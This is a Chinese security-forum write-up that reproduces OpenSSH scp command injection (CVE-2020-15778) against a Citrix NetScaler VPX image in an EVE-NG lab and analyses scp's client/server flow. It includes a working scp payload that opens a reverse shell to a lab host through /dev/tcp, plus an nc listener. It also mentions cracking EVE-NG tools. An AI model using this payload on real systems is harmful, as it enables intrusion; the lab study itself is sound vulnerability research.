0x01 环境搭建
---------

安装EVE-NG虚拟机环境，安装工具并patch工具破解，ssh连接、用户：admin/eve，root/eve，在EVE-NG官网上可以查看到所支持的防火墙镜像，如下图所示。

![image-20221108231520051.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-222e66bbe318b03f01a1d63928019b8f1ec3698d.png)

将防火墙固件放在EVE指定镜像目录，步骤如下，这里的镜像是qcow2文件类型，需要qemu方式模拟：

![image-20221108231434089.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b2fbb9fcf6e9f0abc68ff43600e948569bc08219.png)

EVE-NG对Qemu镜像文件的目录和文件名有严格要求，每个导入 /opt/unetlab/addons/qemu/ 目录下的qemu镜像必须放在一个父目录下，其父目录名称和镜像名称都要按照官方给定的规则进行命名，如果不符合规则会导致对应镜像无法与相应的模板匹配，从而无法被EVS-NG识别。

官网有一个对应的文档可以查看什么固件对应的命名方式，给定镜像文件名是nsvpx-10.5.54.9009，所以文件夹命名为nsvpx-xxx，正好对应，不用修改，将镜像文件移进去即可，然后镜像文件名保持不变即可。

修改固件权限：

`/opt/unetlab/wrappers/unl\_wrapper -a fixpermissions`

新建一个lab，然后添加节点,可以看到一个可用，这就是我先前加入的镜像（citrix）

![image-20221023213547044.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-45a3ed5bb1e195a168aab82e3f3675476de3b027.png)

然后进行网口、cpu、内存等基础配置后，设备由灰色变成蓝色就说明启动成功了，可以通过telnet进行连接，开机：

然后会因为不兼容导致在boot loader时卡死，下载新版的citrit镜像：链接：[https://pan.baidu.com/s/1D3Cpirav404\_\_nTFz5HsJw](https://pan.baidu.com/s/1D3Cpirav404__nTFz5HsJw) 提取码：wpdx

默认密码：nsroot/nsroot。修改后密码为root（自己设置）

接下来有一个小小的试错的过程，如果要复现可以注意避免踩下面一步的坑。  
查看接口信息：`show ns ip`，发现防火墙的默认ip为192.168.100.1，而EVE系统的ip为192.168.203.82，两者并不能相互ping通，所以需要修改防火墙或者是EVE系统的静态ip，或者设置DHCP动态分配IP。192.168.203.82这个ip对应的是我本机中无线网卡的ip。

```js
set ns config -IPAddress 192.168.203.10 -netmask 255.255.255.0  
add ns ip 192.168.203.10 255.255.255.0 -type snip  
add route 0.0.0.0 0.0.0.0 10.102.29.1  
save ns config  
reboot
```

修改后发现依然是网络不可达，是eve系统与防火墙虚拟机网络不可达。

查询资料可以尝试，添加一个network，（这里用的是cloud1），network序号对应的是vmware网口的序号，在vmware中给EVE系统添加一个网口，连接到VMware1，然后配置修改虚拟网卡VMware的ip与防火墙系统在一个段内。这里添加了一个网卡，为防止上面修改的ip和无线网卡IP冲突，将防火墙ip改回原来默认设置.

```js
set ns config -IPAddress 192.168.100.1 -netmask 255.255.255.0  
add ns ip 192.168.100.1 255.255.255.0 -type snip  
add route 0.0.0.0 0.0.0.0 10.102.29.1  
save ns config  
reboot
```

之后对应的步骤如下

添加一个cloud，选择cloud1

![image-20221024113614696.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-05b99dc3cbaf265214329e8742ea73b7c0018f67.png)

在防火墙关机的状态下与防火墙端口1进行连接

![image-20221024113414284.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-df40297f7776052af5046e3c4f3f0e98b5159762.png)

防火墙主机ip：

![image-20221024113746637.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-de34f51336947c5b754c2d20a03c9b0e82056beb.png)

给EVE系统虚拟机添加一个网口，给到特定网卡VMware1

![image-20221024113944696.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-69be988a862efefc735b4ec52696af905e98e204.png)

设计VMware1虚拟网卡的ip，

![image-20221024114045741.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1a4cf20183b6cd6c9c8fc3e11b8442829d4ecb00.png)

然后防火墙开机后就可以利用主机访问<http://192.168.100.1> 即可访问到防火墙的管理端口，利用nsroot登录。

![image-20221024114252284.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-5b978426a1ec3c14b98f004e5867be2a4a26d62b.png)

![image-20221024114609817.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-69724902cb25960a1a6f5add19b1f10f34bf2490.png)

0x02固件解包
--------

首先从官网下载对应版本的固件：

![image-20221025113219433.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9d611bb74534b520c858abd3c0c26ae748857e17.png)

下载后是一个压缩包，直接解压如下所示，将里面的所有压缩包都解压看了一下有工具、内核、引导程序、环境等等，我认为固件存在与图中的几个bin文件中。

![image-20221025113421713.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-24885b947158d59cd67334605bc0c2980e0fe5e4.png)

利用010Editor中的文件比对工具比对这几个bin文件是否有所不同，还是有很大的差别，所以需要将每个固件都解包看一下。

![image-20221025120032058.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7a6f485f905d77adfd741a4e86ddd577a4cd589a.png)

利用binwalk递归解包得到如下文件。

![image-20221025113954341.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-adff82720eb418cdec66eb8d8b963f56ecd5a5e4.png)

cramfs文件系统已经被解包：

![image-20221025115557032.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8d7d5ea54326b0a2d585bc3369c475634c1d3774.png)

但是直接利用binwalk解包会发现文件系统不完整，这里需要利用cramfs自带的工具手动解包：需要下载cranfs的工具进行分解，得到文件系统，安装cramfs工具的连接安装说明：

[1.1-6build4 : cramfsprogs : amd64 : Xenial (16.04) : Ubuntu (launchpad.net)](https://launchpad.net/ubuntu/xenial/amd64/cramfsprogs/1.1-6build4)

`sudo dpkg -i cramfsprogs\_1.1-6ubuntu1\_amd64.deb`

```js

命令使用：

mkcramfs工具用来创建CRAMFS文件系统  
​  
\*\*# mkcramfs dirname outfile\*\*  
​  
cramfsck工具用来进行CRAMFS文件系统的释放和检查  
​  
\*\*# cramfsck -x dirname filename\*\*  
​  
\-x dirname 表示释放到dirname所指定的目录中.  
​  
​  
例如：  
​  
\*\*cramfsck -x root root.cramfs\*\* 解压\*.cramfs 文件  
​  
\*\*mkcramfs root root.cramfs\*\* 压缩root根文件为root.cramfs
```

其他的bin文件解包后得到的文件系统：

![image-20221025120152883.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-db62d12b98b4acacf2863c55680d021558cd4e95.png)

![image-20221025120317457.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f9a3cda7ab30c5a0078704377439f00ffb135e07.png)

找了文件系统中所有的文件，找到了关于openssl以及ssl配置等文件，但是没有找到关于sshd的文件，可能是固件解包的时候一些文件没有正确识别导致，这里我发现可以通过搭建的环境将sshd文件从usr/bin文件夹下复制到tmp文件夹下，而且通过下载固件已经解析出的文件来看存在python环境，则可以在tmp文件夹下开启一个http服务器以下载任意文件。

`$ python -m SimpleHTTPServer 8000`

![image-20221025151502408.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1a1c3a9a3be66c1c563a138d126db8d611df57d2.png)

然后访问8000端口既可下载sshd文件。

![image-20221025151652628.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4c07f305f8f5c77e6acef9876bca33867162d5f9.png)

0x03 ssh服务与openssh漏洞复现
----------------------

SSH 即Secure Shell，它主要由三部分组成：

![image-20221026102822906.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1499e2f2f8b047b109f4caed47a08c62fe1c7004.png)

通过对sshd二进制程序逆向，对字符串进行检索，sshd底层依靠ssl提供加密安全传输功能。OpenSSH是使用SSH通过计算机网络加密通讯的实现，它是取代由SSH所提供的商用版本的开放源代码方案。OpenSSH服务可以通过/etc/ssh/sshd\_config文件进行配置。

![image-20221026102601781.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9e6ec00ca9acbac7f6d5b827a8d428ff29c03ed9.png)

![image-20221026103714493.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1bfa0753ed162da0c1e8e3fcb82117048dee9888.png)

SSL 是保护网络传输数据的协议，是安全地在互联网中传输的基石。而 SSH 只是一种用于主机用户登录，安全共享数据的网络应用程序。ssh提供了两个服务： ssh远程登录的服务，sftp传输文件的服务

ssh服务默认开启：

![image-20221024201751189.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-35b281a68b817d95f2da0e2adbe0972ebfe0f29c.png)

ssh登陆后发现命令中有shell可以进入其shell。

![image-20221024201920205.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-6345d41f4ac806b90aaca80416295d3b01722485.png)

查看openssh版本：

![image-20221024202007241.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7b2336c898f827881015139c7521bd284143be27.png)

漏洞cve：OpenSSH 命令注入漏洞（CVE-2020-15778）

```js

CVE编号：CVE-2020-15778  
​  
发布时间：2020-07-24  
​  
危害等级：高危  
​  
漏洞版本：<= openssh-8.3p1  
​  
漏洞描述：OpenSSH  8.3p1及之前版本中的scp的scp.c文件存在操作系统命令注入漏洞。该漏洞即使在禁用ssh登录的情况下，但是允许使用scp传文件，而且远程服务器允许使用反引号(\`)，可利用scp复制文件到远程服务器时，执行带有payload的scp命令，从而在后续利用中getshell。  
​  
利用条件：知道目标的ssh密码

模拟场景：仅允许使用scp，ssh接口未开启的场景，让该漏洞在特殊环境下实现命令注入。
```

利用方式：

scp 1.tgz nsroot@192.168.100.1:'`bash -c "bash -i &gt;&amp; /dev/tcp/192.168.100.6/9999 0&gt;&amp;1"`'

进行nc监听：nc -lvp 9999，然后通过scp进行文件上传同时利用`符号进行命令注入，从而可以达到命令执行的效果（攻击机需要接入网络，这里设置VMware1网口，并配置攻击机的ip与云在一个网段即可）

![image-20221024214444313.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-2a94984d4271522042f2a182ff940c7699f97066.png)

反弹shell效果：

![image-20221024214707309.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3116b88e80591aa9bb87fb15b5e61d77b9f77b84.png)

0x04 openssh(scp)漏洞点分析
----------------------

SCP（Secure Copy）：scp就是secure copy，是用来进行远程文件复制的，并且整个复制过程是加密的。数据传输使用ssh，并且和使用和ssh相同的认证方式，提供相同的安全保证。SCP依赖openssh软件包提供功能。

在正常情况下，在服务器系统中scp服务没有相关进程，而当scp传输文件时，scp进程出现，而且根据传输的目录不同有不同的参数。ssh服务一直开启监听，所以当客户端通过scp请求时，先通过ssh接收请求，并根据请求运行scp程序，所以当sshd进程被我手动杀掉之后，scp服务无法正常连接。

![image-20221027155007134.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9df1605c2428b4cbb9a34e893824f159a96e7ba4.png)

发送时，在scp进程中，子进程为ssh。

1、本地启用子进程，执行ssh命令，作为ssh client端，连接远端ssh server。（在ssh子进程中，使用dup2将“标准输入输出”和“管道”绑定；此时scp进程监听管道另一端）。  
2、ssh client通过SSH\_CMSG\_EXEC\_CMD消息将“scp -f -- 文件名”命令发送给ssh server。接收时，在sshd子进程中，创建scp孙进程。

3.ssh server进程隐藏的流程如下：  
1）解析参数；  
2）主进程作为守护进程daemon，一直在server\_accept\_loop中循环监听端口；  
3）监听到一个ssh client连接，则创建一个sshd子进程，监听socket。  
4)、sshd子进程收到scp命令后，启用scp孙进程执行此命令。（在scp孙进程中，使用dup2将“标准输入输出”和“管道”绑定；此时sshd子进程监听管道另一端）  
5)、scp孙进程发现-f参数，知道自己是源端，执行source（）函数，直接写入“标准输出”，即管道，被sshd子进程接收到。因为此sshd子进程和ssh client是一一对应的，sshd子进程收到数据后，缓存到stdout\_buffer，然后组成SSH\_SMSG\_STDOUT\_DATA报文，进而发送到ssh client端；  
6)、ssh client收到后，也存入stdout\_buffer，然后打印到“标准输出”。  
7)、因为第1步的原因，本地scp进程收到内容。

首先分析客户端发送功能，首先main主函数利用一个while循环，利用getopt函数循环处理参数，比如验证协议兼容性、配置远程端口、远程地址、是否通过local、f/t发送或者接受、scp或者sftp模式等等。如下图所示，对于这一部分可以在scp.c的开源代码中直接参考对比理解。

![image-20221027231909758.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-6a1b4cc054746046ca69a9e7a9fc74370c39547d.png)

![image-20221027232101347.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ed2b9575f5bf8d2c2b05bcac153c9d06e8746d37.png)

处理参数结束之后，会进入ssh执行，方式则是通过toremote和tolocal两个函数的调用：

![image-20221027232326212.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-25e2ceec97ad4b4227a61adf5a8d3c59e0343170.png)

toremote()分三种：1）远端到远端，通过本地。（分解为两步：远端到本地，本地到远端）2）远端到远端，不通过本地 3）本地到远端。这三种方式下都分为sftp和scp的传输模式，这里只分析scp。

第一种对于远端到远端的scp，这里需要使用两个do\_cmd命令，一个是f接受模式，一个是t发送模式，分别对于两个remote端，然后通过通道与ssh进程交互，通过ssh进程与server交互。此模式下通过本地。

![image-20221027233648728.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a80736cb1cadbefdc1ed446007bcf8b2e002d48b.png)

do\_cmd的功能，首先通过pipe作为“父子”进程之间的通信机制，使用dup2将“pipe”和“标准输入输出口”绑定，实现与ssh进程通信的功能，然后fork一个子进程，配置参数后调用execvp执行程序并附带参数执行。

![image-20221027234219182.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c05b6a5888b2e313be72c4a174c73af6b8845099.png)

![image-20221027234238090.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-d7f63f15d0b9247da2510a0564e5fb5a1df3a00f.png)

不同的是第一个do\_cmd函数相比第二个多了一部分设置pipe作为“父子”进程之间的通信机制以及使用dup2将“管道”和“标准输入输出口”绑定。第二个do\_cmd2需要使用第一个函数调用建立起来的通道。

第二种对于标准下的远端到远端的scp，通过scp命令通过ssh进程将第二个远程用户传递给第一个远程端，不通过本地。

![image-20221028082725297.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a9ca5550c816f5cb45367eca416be5e9f137db62.png)

第三种情况是本地到远端，这一种与第一种远端到远端通过本地的情况相类似，但是这里只需要用一个do\_cmd函数即可，指定的模式为t传输模式。

![image-20221028082907174.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-e4b3508354887e772800d9455a74ac8c4c496c58.png)

对于toloacl，tolocal()分为两种：1）本地到本地（通过执行cp命令）。2）远端到本地：

对于本地到本地的情况，直接通过cp命令实现。

![image-20221028083504398.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f01576ebb515030addb2bd2b44f2a0a7599d4f5e.png)

romote到local与前面toremote函数种的local到remote情况相类似，仅仅是模式由t变为f。这个过程为“本地scp进程 &lt;-----pipe----&gt; 本地ssh子进程 &lt; -------socket------&gt; server端sshd进程 &lt;-------pipe--------&gt; server端scp进程”。

![image-20221028083651572.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-19097ece7e6062c711d07a617f474d276f62d446.png)

根据上述scp传输原理的分析，在toloacl和toremote两个函数种，对于非本地的cp传输都是利用ssh进程辅助实现，并且在服务端由sshd通过pipe通道控制scp进程执行scp命令。这里存在命令执行点，而且scp的参数可以控制，则可能存在命令注入的情况。

当执行传输大文件时，服务器scp进程会起来并维持较长的时间，这里可以抓到服务端scp的进程，如下图所示，这里有一个关键的地方是/tmp，这里会将文件位置与scp命令拼接之后传入bash执行，在Bash 脚本中，(反引号``)运算符和 $()的使用方式可以进行bash命令执行。

![image-20221027155345617.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a1f5e764ed1adcf34cd5e77270bd99f561049b48.png)

比如当输入如下命令时，有下图所示的结果，引号内的payload作为传输地址传入，但是会按照bash语句执行。

```js

scp 1.tgz nsroot@192.168.100.1:'\`bash -c "bash -i >& /dev/tcp/192.168.100.6/9999 0>&1"\`'

```

![image-20221027160025675.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-549e44107c6cc54c4b2c0f7253a5a9431b79b603.png)

动态分析ssh与scp的调用关系和执行过程：

系统自己有gdb和gdbserver，就不需要我们交叉编译对应版本的工具。

![image-20221027122416256.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9acfe1d5f1faa9a7eeaf8ecdb4171c32a8f04537.png)

但是server端的scp服务是有客户端发起请求后，由server端的sshd起来的程序，当不发生请求时不存在scp进行，无法通过attach的方式进行动态调试。

针对于sshd进程的调试可以进行，可以尝试调试其scp请求访问时，server端的sshd的反应。在server端查看ssh进程，然后利用gdb attach方式调试进程：

![image-20221028152855865.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-037a4547cd75217e49436d4d097de2eafcbdfbe8.png)

但是在调试的过程中发生问题，如上图所示，第一个进程1137为守护进程，负责循环监听端口，这个是websocket是负责提供一个web端的ssh。进程64514也是一个守护监听进程。

当我开启一个ssh连接或者scp基于ssh的连接之后，会新起一个ssh的子进程，如下图所示，所以我需要调试的进程是这个新起的进程，无法正常的调试。

![image-20221028161721969.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9252a9851a1c9b38010780cd5ef6773ea204d4c8.png)